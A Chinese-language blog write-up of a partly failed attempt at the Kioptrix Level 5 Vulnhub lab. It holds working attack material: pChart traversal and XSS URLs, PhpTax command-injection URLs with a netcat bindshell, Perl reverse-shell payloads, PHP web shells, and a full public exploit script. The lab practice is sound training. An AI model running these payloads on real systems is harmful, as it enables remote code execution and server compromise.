---
title: Vulnhub-KIOPTRIX LEVEL 5
date: 2024-01-29  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Kioptrix-level5.html"
---

# KIOPTRIX LEVEL 5（失败）

![image-20240128160520795](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217151.png)

## 漫长的debug（网卡无法连接/无法获取IP）

打开环境，如果获取不到IP的话，可以修改一下`.vmx`，将桥接模式改为`NAT`，打开以后发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217152.png" alt="image-20240128163309166" style="zoom: 67%;" />

扫一下，不阔以扫到。。。。那就按上一期的操作，创建虚拟机，删除网卡，加载给的网卡再次尝试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217154.png" alt="image-20240128172543800" style="zoom:50%;" />

作者说在10上百分百支持的，不节外生枝了（实际上踩坑了，假装没踩）：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217155.png" alt="image-20240128172843901" style="zoom: 50%;" />

还是寄：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217156.png" alt="image-20240128173253191" style="zoom:33%;" />

扫不出来一点点。。。。再将原有的`.vmx`打开，然后将硬盘删除，重新添加，出现了以下界面：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217157.png" alt="image-20240128174716317" style="zoom: 67%;" />

搜索，搜到了一篇疑似[解答]([Kioptrix: 2014 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/655396834))，输入下面代码以后，顺利打开：

```bash
ufs:/dev/ada0p2
```

但问题还是没有得到解决。。。按照官网进行修改试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217158.png" alt="image-20240128175851571" style="zoom:50%;" />

这个是我直接修改的，不行，得按照下面官方靶场写的来：

![image-20240128180132217](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217159.png)

出现报错：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217160.png" alt="image-20240128180557740" style="zoom:50%;" />

尝试进行升级到10试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217161.png" alt="image-20240128180700206" style="zoom:50%;" />

然后打开，还是搞不了。。。。。。淦！放飞自我，瞎几把改了，这个靶场暂时做不了，先不搞了。

注意到报错：`vmware ”scsi0:0“已断开`，搜索到：

![image-20240128181539665](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217162.png)

我直接将所有的配置全部删除再添加！

结果又出了错误`folppy()断开连接`还有`无法连接虚拟设备 ide0:1，因为主机上没有相应的设备。`

打开发现可以扫到了。。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217163.png" alt="image-20240128181942221" style="zoom:50%;" />

我真的要tu了，为了以防万一，打开看一下是不是靶场：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217164.png" alt="image-20240128182024288" style="zoom:33%;" />

work不了一点，我直接给你一拳（开玩笑的，还是感谢师傅耐心做靶场，非常感谢！！！）

下面开始攻击！

> 这里后来发现作者说了一下他的靶场需要重新更换网络适配器。

## 踩点一下

查看一下源代码，发现了一个`pChart 2.1.3`配置，查看一下`wappalyzer`分析出来的服务器相关配置：

```html
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>
 <body>
  <h1>It works!</h1>
 </body>
</html>
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217165.png" alt="image-20240129142514654" style="zoom: 50%;" />

尝试看一下有没有`robots.txt`文件。

## 端口扫描

```shell
rustscan -a 192.168.244.144 --ulimit 5000
# .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
# | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
# | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
# `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
# The Modern Day Port Scanner.
# ________________________________________
# : https://discord.gg/GFrQsGy           :
# : https://github.com/RustScan/RustScan :
#  --------------------------------------
# Nmap? More like slowmap.🐢

# [~] The config file is expected to be at "/home/kali/.rustscan.toml"
# [~] Automatically increasing ulimit value to 5000.
# Open 192.168.244.144:80
# Open 192.168.244.144:8080
# [~] Starting Script(s)
# [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                                                         
# [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 01:27 EST                   
# Initiating Ping Scan at 01:27                                                           
# Scanning 192.168.244.144 [2 ports]                                                       
# Completed Ping Scan at 01:27, 0.00s elapsed (1 total hosts)                             
# Initiating Parallel DNS resolution of 1 host. at 01:27                                   
# Completed Parallel DNS resolution of 1 host. at 01:27, 2.16s elapsed                     
# DNS resolution of 1 IPs took 2.16s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                                 
# Initiating Connect Scan at 01:27                                                         
# Scanning 192.168.244.144 [2 ports]                                                       
# Discovered open port 8080/tcp on 192.168.244.144                                         
# Discovered open port 80/tcp on 192.168.244.144                                           
# Completed Connect Scan at 01:27, 0.00s elapsed (2 total ports)                           
# Nmap scan report for 192.168.244.144                                                     
# Host is up, received syn-ack (0.00056s latency).                                         
# Scanned at 2024-01-29 01:27:12 EST for 0s                                               
# PORT     STATE SERVICE    REASON                                                         
# 80/tcp   open  http       syn-ack                                                       
# 8080/tcp open  http-proxy syn-ack                                                       
# Read data files from: /usr/bin/../share/nmap                                             
# Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds
```

发现开放了`80`和`8080`端口，尝试看看：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217166.png" alt="image-20240129143231388" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217167.png" alt="image-20240129143258344" style="zoom: 50%;" />

## 目录扫描

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.244.144 -f -t 200
# dir: 指示Gobuster执行目录扫描。
# -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: 指定用于扫描的字典文件的路径和文件名。
# -u http://192.168.244.144: 指定要扫描的目标URL。
# -f: 在输出中显示完整的URL路径。
# -t 200: 指定线程数，这里设置为200。
```

遇到了报错：

![image-20240129150354641](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217168.png)

换dirsearch，虽然没有报错，但是也一无所获：

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.244.144/ -e* -x 404,403 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 14594
Output File: /home/kali/reports/http_192.168.244.144/__24-01-29_02-01-23.txt
Target: http://192.168.244.144/

[02:01:23] Starting: 
[02:02:03] 500 -  535B  - /cgi-bin/printenv                                  
[02:02:04] 500 -  535B  - /cgi-bin/test-cgi                                  
                                                                            
Task Completed
```

以防万一，尝试使用`dirb`进行扫描：

```shell
dirb http://192.168.244.144/
# -----------------
# DIRB v2.22    
# By The Dark Raver
# -----------------
# START_TIME: Mon Jan 29 02:07:43 2024
# URL_BASE: http://192.168.244.144/
# WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
# -----------------
# GENERATED WORDS: 4612                                                          
# ---- Scanning URL: http://192.168.244.144/ ----
# + http://192.168.244.144/cgi-bin/ (CODE:403|SIZE:210)                                       
# + http://192.168.244.144/index.html (CODE:200|SIZE:152)                                                                     
# -----------------
# END_TIME: Mon Jan 29 02:08:09 2024
# DOWNLOADED: 4612 - FOUND: 2
```

## 寻找漏洞

刚刚再源代码里找到了一个配置的版本号，尝试搜索一下相关漏洞：

![image-20240129160256578](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217169.png)

正好版本和我们的版本一致，我们看一下漏洞是啥样的：

```text
# Exploit Title: pChart 2.1.3 Directory Traversal and Reflected XSS
# Date: 2014-01-24
# Exploit Author: Balazs Makany
# Vendor Homepage: www.pchart.net
# Software Link: www.pchart.net/download
# Google Dork: intitle:"pChart 2.x - examples" intext:"2.1.3"
# Version: 2.1.3
# Tested on: N/A (Web Application. Tested on FreeBSD and Apache)
# CVE : N/A

[0] Summary:
PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
It is plausible that custom built production code contains similar
problems if the usage of the library was copied from the examples.
The exploit author engaged the vendor before publicly disclosing the
vulnerability and consequently the vendor released an official fix
before the vulnerability was published.

[1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.

Directory Traversal remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.

[2] Cross-Site Scripting (XSS):
"hxxp://localhost/examples/sandbox/script/session.php?<script>alert('XSS')</script>
This file uses multiple variables throughout the session, and most of
them are vulnerable to XSS attacks. Certain parameters are persistent
throughout the session and therefore persists until the user session
is active. The parameters are unfiltered.

Cross-Site Scripting remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.

[3] Disclosure timeline:
2014 January 16 - Vulnerability confirmed, vendor contacted
2014 January 17 - Vendor replied, responsible disclosure was orchestrated
2014 January 24 - Vendor was inquired about progress, vendor replied
and noted that the official patch is released.
```

## 漏洞利用(未利用成功)

可以看到是一个目录遍历/文件泄露漏洞，尝试进行利用一下，但是发现无法直接利用，没有发现php文件，重新回顾一下，可以看到之前的`pchart`有个目录，搜索一下，看看能不能访问相关目录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217170.png" alt="image-20240129161058040" style="zoom:50%;" />

竟然可以进行访问，爽死了！找一下php文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217171.png" alt="image-20240129161324139" style="zoom:50%;" />

尝试构造payload：

```css
http://192.168.244.144/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
```

![](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217172.png)

可以看到这个漏洞是可以进行利用的，尝试读取相关目录文件：

```css
http://192.168.244.144/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
```

![image-20240129161654877](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217173.png)

可以看淡系统版本为`FreeBSD 9.0`，尝试搜索相关漏洞：

![image-20240129161927669](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217174.png)

找到两个权限提示的漏洞，看来得从别的地方着手先获取一个普通用户。

查看一下Apache服务器相关配置文件，看看能不能拿到敏感数据。搜索一下：

![image-20240129162501746](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217175.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217176.png" alt="image-20240129162729726" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217177.png" alt="image-20240129163101271" style="zoom:33%;" />

然后进行查看：

```apl
http://192.168.244.144/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
```

可看到之前没有扫成功也是很正常的，apache配置了拒绝连接了，我们查看以后发现apache服务器对于访问请求头有要求，必须为`8080端口允许的User-Agent为：Mozilla/4.0 Mozilla4_browser`。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217178.png" alt="image-20240129171645499" style="zoom:50%;" />

使用插件修改请求头尝试进行访问：

这里我使用的是：`HackBar V2 by chewbaka`。

![image-20240129164409226](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217179.png)



打开看一下：

![image-20240129164600866](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217180.png)

到处点一下，没有啥收获，搜一下这是个啥：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217181.png" alt="image-20240129172340948" style="zoom:50%;" />



好家伙，这可不是我想搜到的嗷，我们直接利用一下吧：

![image-20240129172744914](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217182.png)

```shell
-----------------------------------------------------
phptax 0.8 <= Remote Code Execution Vulnerability
-----------------------------------------------------
Discovered by: Jean Pascal Pereira <pereira@secbiz.de>
Vendor information:
"PhpTax is free software to do your U.S. income taxes. Tested under Unix environment.
The program generates .pdfs that can be printed and sent to the IRS. See homepage for details and screenshot."
Vendor URI: http://sourceforge.net/projects/phptax/
----------------------------------------------------
Risk-level: High
The application is prone to a remote code execution vulnerability.
----------------------------------------------------
drawimage.php, line 63:
include ("./files/$_GET[pfilez]");
// makes a png image
$pfilef=str_replace(".tob",".png",$_GET[pfilez]);
$pfilep=str_replace(".tob",".pdf",$_GET[pfilez]);
Header("Content-type: image/png");
if ($_GET[pdf] == "") Imagepng($image);
if ($_GET[pdf] == "make") Imagepng($image,"./data/pdf/$pfilef");
if ($_GET[pdf] == "make") exec("convert ./data/pdf/$pfilef ./data/pdf/$pfilep");
----------------------------------------------------
Exploit / Proof of Concept:
Bindshell on port 23235 using netcat:
http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
** Exploit-DB Verified:**
http://localhost/phptax/index.php?pfilez=1040d1-pg2.tob;nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
----------------------------------------------------
Solution:
Do some input validation.
----------------------------------------------------    
```

尝试利用，尝试传一个一句话木马上去：

```apl
http://192.168.244.144:8080/phptax/index.php?pfilez=xxx;echo%20%22%3C%3Fphp%20system(\$_GET['hack']); %3F%3E%22%20>%20shell.php;&pdf=make
# http://192.168.244.144:8080/phptax/index.php?pfilez=xxx;echo "<?php system(\$_GET['hack']); ?>" > shell.php;&pdf=make
```

尝试运行：

![image-20240129182939902](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217183.png)

尝试连接，失败，查看[大佬的blog](https://blog.csdn.net/qq_32261191/article/details/118895081)，发现是要通过perl脚本来反弹shell，这一块还是不太会，回头单独学习一下：

```perl
# Server
/phptax/drawimage.php?pfilez=xxx;perl -e 'use Socket;$i="192.168.244.144";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'&pdf=make
# Client
nc -lvp 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217184.png" alt="image-20240129184847428" style="zoom: 50%;" />

发现IP不小心填成靶场IP了，一直连不上。。。。重新来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217185.png" alt="image-20240129185656208" style="zoom:50%;" />

不知道哪里布置的不对，重新来一下：

```perl
# Server
xxx;perl -e 'use Socket;$i="192.168.244.133";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# Client 
nc -nlkvp 1234
```

编码完以后，还是搞不到。。。。可能之前啥地方做的不太对，重新梳理一下思路搞一下试试：

① 抓包

```apl
http://192.168.244.144:8080/phptax
```

②修改`User-Agent:Mozilla/4.0 Mozilla4_browser`

③编码`反弹shell`插入`payload`：

```perl
# perl 反弹shell
perl -e 'use Socket;$i="192.168.244.133";$p=2233;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# payload：
http://localhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&pdf=make
# 修改后
http://192.168.244.144:8080/phptax/drawimage.php?pfilez=xxx;perl -e ‘use Socket;$i=”192.168.244.133"; $p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in( {open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/ bin/sh -i”);};’;&pdf=make
# 编码后
http://192.168.244.144:8080/phptax/drawimage.php?pfilez=xxx;perl+-e+%27use+Socket%3B%24i%3D%22192.168.244.133%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27;&pdf=make
# 开启监听
nc -lvnp 1234
```

不知道为啥，这里就是连不上去。。。。。

换一个办法吧。。。

![image-20240129203101864](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217186.png)

```php
┌──(kali㉿kali)-[~]
└─$ cat 25849.txt
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /
#  / XXXXXX /
# (________(
#  `------'

# Exploit Title   : PhpTax File Manipulation(newvalue,field) Remote Code Execution
# Date            : 31 May 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://phptax.sourceforge.net/
# Software Link   : http://sourceforge.net/projects/phptax/
# Version         : 0.8
# Tested on       : Window and Linux


#####################################################
#VULNERABILITY: FILE MANIPULATION TO REMOTE COMMAND EXECUTION
#####################################################

#index.php

#LINE 32: fwrite fwrite($zz, "$_GET['newvalue']");
#LINE 31: $zz = fopen("./data/$field", "w");
#LINE  2: $field = $_GET['field'];

#####################################################
#DESCRIPTION
#####################################################

#An attacker might write to arbitrary files or inject arbitrary code into a file with this vulnerability.
#User tainted data is used when creating the file name that will be opened or when creating the string that will be written to the file.
#An attacker can try to write arbitrary PHP code in a PHP file allowing to fully compromise the server.


#####################################################
#EXPLOIT
#####################################################

<?php

$options = getopt('u:');

if(!isset($options['u']))
die("\n        Usage example: php exploit.php -u http://target.com/ \n");

$url     =  $options['u'];
$shell = "{$url}/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";

$headers = array('User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)',
'Content-Type: text/plain');

echo "        [+] Submitting request to: {$options['u']}\n";

$handle = curl_init();

curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

$source = curl_exec($handle);
curl_close($handle);

if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r'))
{
echo "        [+] Exploit completed successfully!\n";
echo "        ______________________________________________\n\n        {$url}/data/rce.php?cmd=id\n";
}
else
{
die("        [+] Exploit was unsuccessful.\n");
}

?>

################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################ 
```

注意到

```php
/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E
==> /index.php?field=rce.php&newvalue=<?php passthru($_GET[cmd]);?>
```

通过`field`和`newvalue`参数创建文件，并写入命令执行代码：

![image-20240129204256359](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217187.png)

貌似执行成功了，尝试一下看看能不能执行命令：

![image-20240129204357760](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217188.png)

成功！这样一来就好办了，写一个一句话木马，然后连接：

```php
http://192.168.244.144:8080/phptax/index.php?field=rce.php&newvalue=<?php @eval($_POST['hack']);?>
```

蚁剑连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217189.png" alt="image-20240129205132178" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217190.png" alt="image-20240129205147206" style="zoom:50%;" />

拿到普通用户权限了，尝试使用内核漏洞进行提权，不过我们可以保险起见，再查一下内核版本对不对：

```shell
(www:/usr/local/www/apache22/data2/phptax/data) $ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

进行提权：

```shell
# Server 
cd /tmp
nc 192.168.244.133 1234 > 26368.c
# Client
nc -lvp 1234 < 26368.c 
```

监听会中断，但是已经传过去了。

编译运行即可获得 root 权限，但是我这里不知道为啥一直不行。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401292217191.png" alt="image-20240129213322195" style="zoom:50%;" />

就到这吧，`metasploit`也尝试了，死都搞不好，可恶，难道又犯低级错误了？

## 重启靶场，全部推到重来

因为是重新来，我就不说了，仅展示关键代码及结果是否正确：

```perl
/phptax/drawimage.php?pfilez=xxx;%20perl -e 'use Socket;$i="192.168.244.144";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};';&pdf=make
# URL编码
/phptax/drawimage.php?pfilez=xxx;%20perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.244.144%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22/bin/bash%20-i%22%29%3B%7D%3B';&pdf=make
```

经过尝试，失败，不知道是啥原因，下回再试吧，有其他事情要忙了，害。



